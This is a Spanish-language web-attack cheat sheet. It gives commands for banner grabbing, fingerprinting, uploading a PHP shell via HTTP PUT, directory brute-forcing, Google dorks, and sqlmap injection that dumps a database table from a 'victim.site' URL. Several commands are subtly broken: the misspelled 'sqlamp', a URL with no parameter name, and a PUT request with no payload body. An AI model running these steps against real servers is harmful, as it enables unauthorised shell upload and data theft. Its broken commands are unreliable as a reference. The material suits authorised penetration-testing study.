# Web Attacks
¿Qué es un ataque basado en la web?
Un ataque a una aplicación web es cualquier intento por parte de un actor malicioso de comprometer la seguridad de una aplicación basada en la web. Los ataques a aplicaciones web pueden tener como objetivo la propia aplicación para obtener acceso a datos confidenciales o pueden usar la aplicación como una publicación para lanzar ataques contra los usuarios de la aplicación.

### Banner grabbing
```
nc -v <target> <port>
HEAD / HTTP/1.0
```

### HTTPS services
```
openssl s_client -connect <target>:<port>
HEAD / HTTP/1.0
```


### Fingerpriting with Httprint
```
httprint -P0 -h <target> -s <signature file>
```


### HTTP Verbs
```
GET, POST, HEAD, PUT, DELETE, OPTIONS
```

### Using PUT to upload shell
```
# Get the content length of the shell
wc -m shell.php
<payload content length output>

# Then using nc to upload with the PUT method
nc <target> <port>
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: <length of payload>
```

### Directory and File Enumeration
La enumeración de archivos y directorios puede conducir a muchos recursos ocultos que podrían contener:

- Funciones nuevas y no probadas
- Archivos de respaldo
- Información de prueba
- Notas del desarrollador

```
# Dirb es una gran herramienta para usar en directorios/archivos de fuerza bruta
dirb http://<target>
  
# Gobuster es otro escáner de directorio/archivo escrito en Go
gobuster -u <target> -w <path to wordlist> -o <file to output to>
```


### Google Dorks
| Comandos              | Uso                                                                                                         |
|-----------------------|-------------------------------------------------------------------------------------------------------------|
| site:                 | Puede usar este comando para incluir solo resultados en un nombre de host determinado.                                    |
| intitle:              | Este comando filtra según el título de una página.                                                          |
| inurl:                | Similar a intitle, pero funciona en la URL de un recurso.                                                   |
| filetype:             | Esto filtra usando la extensión de archivo de un recurso. Por ejemplo, .pdf o .xls.                         |
| AND, OR, &,           | Puede usar operadores lógicos para combinar sus expresiones. Por ejemplo: sitio:ejemplo.com O sitio:otro.com|
| -                     | Puede usar este carácter para filtrar una palabra clave o el resultado de un comando de la consulta.        |

### SQL Injection with SQLMap
```
sqlmap -u <target> -p <paramater> [options]

# Example
sqlmap -u 'http://vicitim.site/search.php?id=2' -p id --technique=U

# Dump contents of a specific table in a database
sqlamp -u 'http://victim.site/search.php?=1' -D <database name> -T <table name> --dump
```
